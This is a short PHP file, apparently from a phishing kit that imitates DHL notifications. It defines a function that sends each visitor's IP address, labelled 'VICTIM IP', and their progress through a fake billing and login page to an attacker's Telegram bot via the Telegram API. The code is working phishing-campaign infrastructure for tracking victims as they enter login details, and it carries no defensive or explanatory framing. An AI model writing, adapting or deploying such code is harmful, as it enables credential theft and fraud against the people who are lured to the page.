<?php
 
require 'telegram.php';

 
 

function note($statu){
	global $api;
	global $chatid;
$msg = "[ DHL NOTIFICATION ]\n💀VICTIM IP : ".$_SERVER['REMOTE_ADDR']."\n🔑STATU : $statu";
sendBot("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg));
}




// BILLING PAGE
if(isset($_POST['billingview'])){
	note("In First page");
}

if(isset($_POST['billinging'])){
	note("Entering LOGIN info...");
}
 

